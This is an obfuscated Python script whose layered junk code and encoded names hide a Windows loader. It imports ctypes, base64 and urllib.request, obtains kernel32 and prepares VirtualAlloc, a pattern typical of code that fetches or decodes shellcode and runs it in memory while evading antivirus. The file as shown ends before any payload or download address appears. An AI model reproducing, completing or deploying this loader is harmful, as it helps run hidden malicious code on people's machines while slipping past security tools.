__4275223127284 = 0
__4275223127284 += 1
try:
    raise MemoryError(__4275223127284)
except MemoryError as __7145770961725:
    if __7145770961725.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(36) > int(210) < int(186) > int(716))) and bool(str(str(511) > int(313) < int(915) > int(124))) > 2 else bool
    if __7145770961725.args[0] == 3:
        __5096096654670 = 227002627469059
__7274555213108 = 0
__7274555213108 += 1
try:
    raise MemoryError(__7274555213108)
except MemoryError as __3103464707385:
    if __3103464707385.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(187) > int(110) < int(94) > int(145))) and bool(str(str(163) > int(42) < int(614) > int(45))) > 2 else str
    if __3103464707385.args[0] == 3:
        __3059462728790 = 69060977472441
    if __3103464707385.args[0] == 4:
        __3546294022994 = 223385294870943
    if __3103464707385.args[0] == 5:
        __7521827725657 = 108255164308286
__5772457356030 = 0
__5772457356030 += 1
try:
    raise MemoryError(__5772457356030)
except MemoryError as __4524838889831:
    if __4524838889831.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(712) > int(37) < int(82) > int(106))) and bool(str(str(813) > int(21) < int(1017) > int(1417))) > 2 else type
    if __4524838889831.args[0] == 3:
        __4914795935168 = 42503929520572
    if __4524838889831.args[0] == 4:
        __6136089865123 = 19790188696913
__4974203409719 = 0
__4974203409719 += 1
try:
    raise MemoryError(__4974203409719)
except MemoryError as __4447875590152:
    if __4447875590152.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(615) > int(419) < int(154) > int(45))) and bool(str(str(95) > int(31) < int(1311) > int(113))) > 2 else int
    if __4447875590152.args[0] == 3:
        __3746602417081 = 77029469512015
    if __4447875590152.args[0] == 4:
        __6726711130805 = 171412462401262
    if __4447875590152.args[0] == 5:
        __7758831902622 = 195890330359104
    if __4447875590152.args[0] == 6:
        __7046943580560 = 168578724575015
    if __4447875590152.args[0] == 7:
        __8602901124176 = 133148707639531
__6595515733583 = 0
__6595515733583 += 1
try:
    raise MemoryError(__6595515733583)
except MemoryError as __2990303645763:
    if __2990303645763.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(116) > int(1817) < int(108) > int(141))) and bool(str(str(93) > int(27) < int(218) > int(117))) > 2 else bytes
    if __2990303645763.args[0] == 3:
        __6789739399460 = 175902684660925
    if __2990303645763.args[0] == 4:
        __4385643443713 = 109142381966000
    if __2990303645763.args[0] == 5:
        __4034457573586 = 11565932219735
__4633576100730 = 0
__4633576100730 += 1
try:
    raise MemoryError(__4633576100730)
except MemoryError as __3302274701037:
    if __3302274701037.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(84) > int(172) < int(919) > int(610))) and bool(str(str(1312) > int(159) < int(57) > int(610))) > 2 else vars
    if __3302274701037.args[0] == 3:
        __2223825217842 = 123401183059922
    if __3302274701037.args[0] == 4:
        __2139307075354 = 77078306994030
    if __3302274701037.args[0] == 5:
        __6496196670766 = 98927760946799
__8384352948998 = 0
__8384352948998 += 1
try:
    raise MemoryError(__8384352948998)
except MemoryError as __5537590690478:
    if __5537590690478.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(812) > int(176) < int(23) > int(1711))) and bool(str(str(613) > int(1811) < int(1914) > int(1816))) > 2 else callable
    if __5537590690478.args[0] == 3:
        __8119383509496 = 273516731521172
__6742557128983 = 0
__6742557128983 += 1
try:
    raise MemoryError(__6742557128983)
except MemoryError as __8393016306574:
    if __8393016306574.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(819) > int(1217) < int(52) > int(515))) and bool(str(str(27) > int(127) < int(144) > int(1016))) > 2 else eval
    if __8393016306574.args[0] == 3:
        __4049055728563 = 277762984624057
    if __8393016306574.args[0] == 4:
        __5959494112017 = 152609559642032
__2167895435664 = 0
__2167895435664 += 1
try:
    raise MemoryError(__2167895435664)
except MemoryError as __7521130069807:
    if __7521130069807.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(146) > int(317) < int(414) > int(917))) and bool(str(str(28) > int(16) < int(1419) > int(1610))) > 2 else list
    if __7521130069807.args[0] == 3:
        __4312149606955 = 250192784251269
    if __7521130069807.args[0] == 4:
        __2739126294750 = 94130583599454
    if __7521130069807.args[0] == 5:
        __7522600266292 = 252467189930987
    if __7521130069807.args[0] == 6:
        __4116598939741 = 10095406535137
__8385851587069 = 0
__8385851587069 += 1
try:
    raise MemoryError(__8385851587069)
except MemoryError as __6374486846417:
    if __6374486846417.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(75) > int(61) < int(1813) > int(717))) and bool(str(str(911) > int(195) < int(412) > int(911))) > 2 else map
    if __6374486846417.args[0] == 3:
        __5936147234409 = 185562011632901
    if __6374486846417.args[0] == 4:
        __6147529928280 = 188716097234669
    if __6374486846417.args[0] == 5:
        __3348151490913 = 146052483281427
__4930742954472 = 0
__4930742954472 += 1
try:
    raise MemoryError(__4930742954472)
except MemoryError as __7440483413297:
    if __7440483413297.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(82) > int(116) < int(618) > int(1815))) and bool(str(str(1312) > int(1914) < int(63) > int(101))) > 2 else __import__
    if __7440483413297.args[0] == 3:
        __2081218862903 = 79864782108041
    if __7440483413297.args[0] == 4:
        __8137016341289 = 170085265731048
__3199093654276 = 0
__3199093654276 += 1
try:
    raise MemoryError(__3199093654276)
except MemoryError as __5819180208056:
    if __5819180208056.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(52) > int(1417) < int(101) > int(1615))) and bool(str(str(169) > int(166) < int(147) > int(914))) > 2 else print
    if __5819180208056.args[0] == 3:
        __8501705111322 = 115978452979808
    if __5819180208056.args[0] == 4:
        __7991969082336 = 134489606857307
    if __5819180208056.args[0] == 5:
        __6874124243948 = 209895913293766
    if __5819180208056.args[0] == 6:
        __5776109712623 = 269002667976589
    if __5819180208056.args[0] == 7:
        __3444780246695 = 257421537811292
__7501535838863 = 0
__7501535838863 += 1
try:
    raise MemoryError(__7501535838863)
except MemoryError as __7104898231010:
    if __7104898231010.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(1810) > int(127) < int(418) > int(1314))) and bool(str(str(49) > int(1417) < int(46) > int(717))) > 2 else input
    if __7104898231010.args[0] == 3:
        __7070162466188 = 160392377703956
    if __7104898231010.args[0] == 4:
        __4630589165788 = 155320239556061
    if __7104898231010.args[0] == 5:
        __3232552123968 = 176065971336095
    if __7104898231010.args[0] == 6:
        __2731611512458 = 12951197658256

def R_E_D__A_V____(RED_DEFENDER, *k):
    __4251814144070 = 0
    __4251814144070 += 1
    try:
        raise MemoryError(__4251814144070)
    except MemoryError as __7736858026476:
        if __7736858026476.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __7736858026476.args[0] == 1:
            globals()['_715'] = (lambda : (lambda _913: _913 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __7736858026476.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __7736858026476.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __7736858026476.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __7736858026476.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _715:
                    globals()['R_E_D____A_V_'] += (lambda : '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __7736858026476.args[0] == 1:
            return R_E_D____A_V
        if __7736858026476.args[0] == 9:
            __3910578486793 = 183798894374481
        if __7736858026476.args[0] == 10:
            __5180585671877 = 243137868239825
        if __7736858026476.args[0] == 11:
            __4517156313505 = 157368895911719

def ______R_E_D__A_V_______(x):
    __5569505190681 = 0
    __5569505190681 += 1
    try:
        raise MemoryError(__5569505190681)
    except MemoryError as __6426685043028:
        if __6426685043028.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __6426685043028.args[0] == 3:
            __5214794977931 = 70420883307397
        if __6426685043028.args[0] == 4:
            __6119681459534 = 168664667075282
        if __6426685043028.args[0] == 5:
            __2642333867746 = 33729425422016
        if __6426685043028.args[0] == 6:
            __2430518537509 = 246914187112445
        if __6426685043028.args[0] == 7:
            __4696646206168 = 72274666084277

def R_E_D__A_V(e):
    __5327253304226 = 0
    __5327253304226 += 1
    try:
        raise MemoryError(__5327253304226)
    except MemoryError as __2928975284261:
        if __2928975284261.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __2928975284261.args[0] == 1:
            r = 0
        if __2928975284261.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __2928975284261.args[0] == 1:
            return r
        if __2928975284261.args[0] == 6:
            __6173041209815 = 115130888852281
        if __2928975284261.args[0] == 7:
            __7615234849304 = 224129180411461
        if __2928975284261.args[0] == 8:
            __2589446163896 = 14794430913063
        if __2928975284261.args[0] == 9:
            __7317316900284 = 32230975941740
        if __2928975284261.args[0] == 10:
            __5783478265427 = 214179958166674

def ____________________________(x):
    __2239758927003 = 0
    __2239758927003 += 1
    try:
        raise MemoryError(__2239758927003)
    except MemoryError as __4886987730266:
        if __4886987730266.args[0] == 1:
            ar = []
        if __4886987730266.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __4886987730266.args[0] == 1:
            return ar
        if __4886987730266.args[0] == 5:
            __5584451037059 = 151134357372160
if (lambda : (lambda _918: _918 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '191' == '56':
        case True:
            raise MemoryError([True])
        case False:
            _319 = [[True], [False]]
            R_E_D__A_V______(['_24'])
    raise MemoryError([True])
except MemoryError as _111:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1713: _1713 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _81 = [[(lambda : (lambda _187: _187 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _613: _613 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _41: _41 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _212:
        import sys
try:
    match '126' == '612':
        case True:
            raise MemoryError([True])
        case False:
            _515 = [[True], [False]]
            R_E_D__A_V______(['_199'])
    raise MemoryError([True])
except MemoryError as _73:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _132: _132 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _133 = [[(lambda : (lambda _158: _158 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1718: _1718 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _1714: _1714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1215:
        import ctypes
try:
    match '1210' == '13':
        case True:
            raise MemoryError([True])
        case False:
            _27 = [[True], [False]]
            R_E_D__A_V______(['_168'])
    raise MemoryError([True])
except MemoryError as _163:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _116: _116 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1812 = [[(lambda : (lambda _43: _43 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1811: _1811 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _195: _195 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _215:
        import base64
try:
    match '151' == '1117':
        case True:
            raise MemoryError([True])
        case False:
            _610 = [[True], [False]]
            R_E_D__A_V______(['_1911'])
    raise MemoryError([True])
except MemoryError as _36:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _127: _127 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _122 = [[(lambda : (lambda _194: _194 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _163: _163 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1013: _1013 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _215:
        import ctypes.wintypes as wt
try:
    match '618' == '414':
        case True:
            raise MemoryError([True])
        case False:
            _93 = [[True], [False]]
            R_E_D__A_V______(['_196'])
    raise MemoryError([True])
except MemoryError as _1316:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1816: _1816 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _122 = [[(lambda : (lambda _129: _129 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _74: _74 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _1916: _1916 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _132:
        import urllib.request
try:
    match '1013' == '315':
        case True:
            raise MemoryError([True])
        case False:
            _814 = [[True], [False]]
            R_E_D__A_V______(['_913'])
    raise MemoryError([True])
except MemoryError as _185:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _915: _915 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _714 = [[(lambda : (lambda _416: _416 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _39: _39 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _413: _413 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _76:
        __5595011458865 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '167' == '1813':
        case True:
            raise MemoryError([True])
        case False:
            _28 = [[True], [False]]
            R_E_D__A_V______(['_183'])
    raise MemoryError([True])
except MemoryError as _111:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1519: _1519 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1412 = [[(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _42: _42 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _411: _411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1611:
        __5595011458865 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '87' == '1210':
        case True:
            raise MemoryError([True])
        case False:
            _214 = [[True], [False]]
            R_E_D__A_V______(['_913'])
    raise MemoryError([True])
except MemoryError as _34:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _58: _58 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _114 = [[(lambda : (lambda _87: _87 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _714: _714 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _219: _219 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _718:
        try:
            raise MemoryError(__5595011458865)
        except MemoryError as __5870734979471:
            if __5870734979471.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __5870734979471.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6405233579779 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x83\x92\xa9\xed\xa02'))()
            if __5870734979471.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7024965371760 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xef+\xe2\x81}\r'))()
            if __5870734979471.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __8129249087931 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xd3\x86\xa7\xdb\xc4m'))()
            if __5870734979471.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __2182746742977 = (lambda : R_E_D__A_V(b'R_E_D__A_V__l\xdd\x16e\xe9\xa1'))()
try:
    match '1615' == '713':
        case True:
            raise MemoryError([True])
        case False:
            _1916 = [[True], [False]]
            R_E_D__A_V______(['_191'])
    raise MemoryError([True])
except MemoryError as _313:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _157: _157 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1214 = [[(lambda : (lambda _613: _613 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _212: _212 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _148: _148 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _716:
        __4267513347527 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '611' == '1917':
        case True:
            raise MemoryError([True])
        case False:
            _65 = [[True], [False]]
            R_E_D__A_V______(['_145'])
    raise MemoryError([True])
except MemoryError as _53:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _612: _612 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1319 = [[(lambda : (lambda _65: _65 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _213: _213 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _136: _136 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _187:
        __4267513347527 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '146' == '37':
        case True:
            raise MemoryError([True])
        case False:
            _185 = [[True], [False]]
            R_E_D__A_V______(['_142'])
    raise MemoryError([True])
except MemoryError as _618:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _185: _185 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1114 = [[(lambda : (lambda _517: _517 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1511: _1511 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _219: _219 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _111:
        try:
            raise MemoryError(__4267513347527)
        except MemoryError as __5630952499109:
            if __5630952499109.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __5630952499109.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6754150806032 = (lambda : R_E_D__A_V(b'R_E_D__A_V__K\x93\x99\r\xe3_'))()
try:
    match '1510' == '218':
        case True:
            raise MemoryError([True])
        case False:
            _1113 = [[True], [False]]
            R_E_D__A_V______(['_148'])
    raise MemoryError([True])
except MemoryError as _1214:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _68: _68 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _18 = [[(lambda : (lambda _818: _818 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _818: _818 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _166: _166 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1512:
        __8192010993867 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '611' == '139':
        case True:
            raise MemoryError([True])
        case False:
            _179 = [[True], [False]]
            R_E_D__A_V______(['_1417'])
    raise MemoryError([True])
except MemoryError as _914:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1411: _1411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1610 = [[(lambda : (lambda _177: _177 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _84: _84 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742707]))))())())()])
